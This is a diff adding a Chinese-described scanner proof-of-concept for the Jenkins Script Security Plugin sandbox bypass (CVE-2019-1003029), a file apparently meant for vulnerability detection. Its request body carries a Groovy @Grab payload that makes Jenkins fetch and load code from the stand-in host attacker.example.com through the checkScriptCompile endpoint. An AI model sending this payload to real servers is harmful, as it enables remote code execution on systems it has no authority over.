@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "通过请求 Jenkins Script Security Plugin 的 checkScriptCompile 端点并提交包含恶意 Groovy Grab 语句的脚本载荷，验证沙箱绕过远程代码执行漏洞是否存在。漏洞位于 GroovySandbox.java 及 SecureGroovyScript.java，攻击者只需 Overall/Read 权限即可在 Jenkins master JVM 上执行任意代码。"
+id = "POC-AVE-2019-0088"
+name = "Jenkins Script Security Plugin 沙箱绕过远程代码执行 PoC"
+severity = "critical"
+tags = ["ave-2019-0088"]
+vuln_id = [
+    "CVE-2019-1003029",
+    "AVE-2019-0088",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+@GrabConfig(disableChecksums=true)
+@GrabResolver(name='http://attacker.example.com')
+@Grab(group='poc', module='poc', version='1.0')
+import poc;
+"""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["org.jenkinsci.plugins.scriptsecurity.sandbox"]
